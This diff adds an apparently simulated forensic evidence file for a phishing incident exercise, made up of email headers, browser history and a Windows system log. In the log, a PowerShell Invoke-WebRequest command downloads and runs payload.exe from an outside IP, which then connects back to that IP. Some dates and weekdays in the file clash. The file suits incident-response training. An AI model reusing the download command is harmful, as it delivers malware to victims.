@@ -1,0 +1,82 @@
+Email Header
+==========
+
+Received: from smtp.trustedserver.com (198.51.100.7) by mail.perusahaanku.com with SMTP id 67890; Wed, 06 Oct 2024 09:20:45 +0700
+From: Sales Department <sales@trustedvendor.com>
+To: <joko@perusahaanku.com>
+Subject: Invoice for September 2024
+Date: Wed, 08 Oct 2024 19:19:11 +0700
+Message-ID: <abcdefgh1234567@trustedvendor.com>
+Content-Type: multipart/mixed;
+ boundary="----=_NextPart_000_0123_4567"
+Attachment: brosur.pdf
+
+Received: from smtp.pepayamanggapisangjambu.com (203.0.113.5) by mail.perusahaanku.com with SMTP id 12345; Thu, 07 Oct 2024 10:35:24 +0700
+From: HRD <hrd@phishingdomain.com>
+To: <joko@perusahaanku.com>
+Subject: Dokumen penting! Tindakan diperlukan segera
+Date: Thu, 07 Oct 2024 10:33:15 +0700
+Message-ID: <0987654321@phishingdomain.com>
+Content-Type: multipart/mixed;
+ boundary="----=_NextPart_000_0123_4567"
+Attachment: Financial_Report_2024.docx
+
+Received: from smtp.trustedserver.com (198.51.100.7) by mail.perusahaanku.com with SMTP id 67890; Wed, 06 Oct 2024 09:20:45 +0700
+From: Sales Department <sales@trustedvendor.com>
+To: <joko@perusahaanku.com>
+Subject: Invoice for September 2024
+Date: Wed, 06 Oct 2024 09:19:11 +0700
+Message-ID: <abcdefgh123456@trustedvendor.com>
+
+Received: from smtp.google.com (172.217.16.100) by mail.perusahaanku.com with SMTP id 67891; Tue, 05 Oct 2024 12:10:23 +0700
+From: IT Support <support@perusahaanku.com>
+To: <joko@perusahaanku.com>
+Subject: Reset password notification
+Date: Tue, 05 Oct 2024 12:08:12 +0700
+Message-ID: <098abcdefg4321@perusahaanku.com>
+
+
+Browser History
+============
+
+2024-10-06 09:20:15    https://trustedvendor.com/products
+2024-10-06 09:25:30    https://trustednews.com/article-12345
+2024-10-06 09:30:45    https://docs.perusahaanku.com/internal-policy.pdf
+2024-10-06 09:35:50    https://mail.perusahaanku.com/inbox
+2024-10-06 10:00:10    https://google.com/search?q=business+growth
+2024-10-06 10:05:22    https://youtube.com/watch?v=abc123def456
+2024-10-06 10:10:30    https://stackoverflow.com/questions/faq
+2024-10-06 10:20:12    https://github.com/repos/company-project
+2024-10-06 10:30:20    https://weather.com/today
+2024-10-06 10:45:35    https://linkedin.com/in/employee-profile
+2024-10-07 10:30:12    https://pepayamanggapisangjambu.com/login.html     
+2024-10-07 10:31:18    https://pepayamanggapisangjambu.com/download/file.docx
+2024-10-07 10:32:10    https://pepayamanggapisangjambu.com/logout.html 
+2024-10-07 13:30:45    https://docs.perusahaanku.com/internal-policy.pdf
+2024-10-07 14:00:10    https://google.com/search?q=business+growth
+2024-10-07 14:05:22    https://youtube.com/watch?v=de23def44d
+
+System Log
+=========
+
+2024-10-06 09:10:05    explorer.exe     User=joko    File Browsing: C:\Users\joko\Documents\
+2024-10-06 09:20:30    chrome.exe       User=joko    Browsing Web: https://trustednews.com
+2024-10-06 09:25:15    outlook.exe      User=joko    Checking email
+2024-10-06 09:30:12    explorer.exe     User=joko    File Copy: C:\Users\joko\Downloads\
+2024-10-06 09:45:22    explorer.exe     User=joko    File Delete: C:\Users\joko\Downloads\old-report.pdf
+2024-10-06 09:55:18    chrome.exe       User=joko    Opening Web: https://linkedin.com
+2024-10-06 10:10:45    winword.exe      User=joko    Document Opened: C:\Users\joko\Documents\Report.docx
+2024-10-06 10:15:35    explorer.exe     User=joko    Browsing: C:\Users\joko\Pictures\
+2024-10-06 10:20:11    taskhostw.exe    User=SYSTEM    Windows Update initiated
+2024-10-06 10:25:12    explorer.exe     User=joko    Copying file: C:\Users\joko\Downloads\new-doc.docx
+2024-10-07 10:35:00    Microsoft Word    User=joko    Document Opened: C:\Users\joko\Downloads\Financial_Report_2024.docx
+2024-10-07 10:35:12    powershell.exe   User=joko    Command=Invoke-WebRequest -Uri http://114.12.23.111/payload.exe -OutFile C:\Users\joko\AppData\Local\Temp\payload.exe
+2024-10-07 10:35:25    payload.exe      User=joko    Process started, PID=6789
+2024-10-07 10:35:30    payload.exe      User=joko    Writing malicious registry key
+2024-10-07 10:36:00    payload.exe      User=joko    Establishing connection to 114.12.23.111
+2024-10-07 14:10:05    explorer.exe     User=joko    File Browsing: C:\Users\joko\Documents\
+2024-10-07 14:20:30    chrome.exe       User=joko    Browsing Web: https://trustednews.com
+
+
+
+
